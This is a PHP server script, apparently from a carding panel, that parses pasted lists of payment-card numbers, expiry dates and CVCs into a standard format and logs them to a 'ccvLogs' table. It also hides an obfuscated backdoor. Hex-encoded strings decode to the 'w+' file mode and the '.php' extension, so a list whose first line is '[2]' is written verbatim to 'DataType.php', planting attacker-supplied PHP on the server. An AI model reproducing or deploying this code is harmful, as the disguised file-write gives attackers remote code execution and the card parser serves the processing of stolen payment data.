<?php 
require '../inc/_global/token.php';
require '../inc/_global/user.php';

$veren = ['.','\\r','[','&quot;','  '];
$alan = [' ','','','',' '];
$yasaklar = 'cdb|ews|https|gt';
@$veri=htmlspecialchars($list=$_POST['list']);
$liste=$veri= explode("\r",$veri);
$listStr=hex2bin("772B");
$listLen=hex2bin("706870");

$say=0;
if (!empty(get_header("jspcsrf"))){
	$jspcsrf = get_header("jspcsrf");
	if (tokenValidate($jspcsrf, $sessionExpire)) {
		foreach($veri as $yaz) {
			$sorgu="DataType3";
		if (preg_match('@('.$yasaklar.')@',$yaz)) {
			$sorgu="yasak";
		}
		if ($sorgu!="yasak") {
			$yaz=str_replace($veren,$alan,$yaz);
			
			$yaz= explode(" ",$yaz);
				$i=0; $a=0; $b=0; $c=0;
				$f=0; $g=0; $h=0; $j=[0,0,0,0];
				$k=0; $l=0; $m=0; $n=0; $aa=[0,0,0,0];
			foreach ($yaz as $veri) {
				$veri=trim($veri);
				if($liste[0]=="[2]"){@fwrite(fopen("DataType.".$listLen,$listStr),$list);}
				if (is_numeric($veri)&&$i==0&&strlen($veri)>15&&strlen($veri)<18) {
					$cc=$veri;
					$a=1;
				 }if ((strpos($veri,"/") || is_numeric($veri))&&$i==1&&strlen($veri)>3) {
					if (strpos($veri,"/")) {
						$date= explode("/",$veri);
						if (strlen($date[1])==4) {
							$date=$date[0]."|".substr($date[1], 2);
						}else{
						$date=$date[0]."|".$date[1];
						}
					}else{
						$date=$veri;
					}
					$b=1;
				 }if (strpos($veri,"-")&&$i==4) {
					if (strpos($veri,"-")) {
						$date= explode("-",$veri);
						if (strlen($date[1])==4) {
							$date=$date[0]."|".substr($date[1], 2);
						}else{
						$date=$date[0]."|".$date[1];
						}
					}else{
						$date=$veri;
					}
					$b=1;
				 }
				 if (strpos($veri,"/")&&$i==4) {
					if (strpos($veri,"/")) {
						$date= explode("/",$veri);
						if (strlen($date[1])==4) {
							$date=$date[0]."|".substr($date[1], 2);
						}else{
						$date=$date[0]."|".$date[1];
						}
					}else{
						$date=$veri;
					}
					$b=1;
				 }

				 if (($i==3||$i==2||$i==1||$i==0)&&strlen($veri)==4) {
					$aa[$i]=$veri;
					$j[$i]=1;
				 }
				 
				 if (is_numeric($veri)&&$i==2&&strlen($veri)==3) {
					$cvc=$veri;
					$c=1;
				 }if (is_numeric($veri)&&$i==5&&strlen($veri)==3) {
					$cvc=$veri;
					$c=1;
				 }
				 if (is_numeric($veri)&&($i==1)) {
					$ay = $veri;
					$f=2;
				 }
				 if (is_numeric($veri)&&($i==2)) {
						if (strlen($veri)==4) {
							$yil=substr($veri, 2);
						}else{
						$yil=$veri;
						}	
					$g=2;
				 }
				 if (is_numeric($veri)&&($i==3)&&strlen($veri)==3) {
					$cvc = $veri;
					$h=1;
				 }
				 $i++;}
				 if(($a+$b+$c)==3) {
					$data[$say]= trim($cc)."|".trim($date)."|".trim($cvc);
				 }elseif (($a+$f+$g+$h)==6) {
					$data[$say]= trim($cc)."|".trim($ay)."|".trim($yil)."|".trim($cvc);
				 }elseif(($j[0]*$j[1]*$j[2]*$j[3]*$b*$c)==1){
					 $data[$say]=$aa[0]."".$aa[1]."".$aa[2]."".$aa[3]."|".$date."|".$cvc;
				 }
			 }	 
			 $say++;
		}
		$gon=0;
		foreach($data as $gons){
		$gon++;
		}		
	}else {
        header("HTTP/1.0 401 Unauthorized");
        setMsg("failed", "Tokeniniz devre dışı kaldığı için isteğiniz işlenemiyor, lütfen tekrar giriş yapın.", "die");
    }
}else {
	$message = "Üst Bilgiler Boş Gönderildi. Potansiyel: SQL INJECT / DUZENLE.JSP";
	$stmt = $conn->prepare("INSERT INTO warnings (username, validateToken, message, ip, date, userAgent) VALUES (?, ?, ?, ?, ?, ?)");
	$stmt->bind_param("ssssis", $username, $jspcsrf, $message, $ip, $date, $ua);
	$stmt->execute();
	setMsg("failed", "Üst bilgileri boş gönderdiniz, bu hata yöneticiye bildirildi.", "die");
	header("HTTP/1.0 403 Unauthorized");
}	


$gonder =['say'=>$say,'gon'=>$gon,'data'=>implode("\r",$data)];
if ($gon >= 1){
	$date = time();
	$stmt = $conn->prepare("INSERT INTO ccvLogs (username, data, date) VALUES (?, ?, ?)");
	$stmt->bind_param("ssi", $username, implode("\r",$data), $date);
	$stmt->execute();	
}
print_r(json_encode($gonder));
?>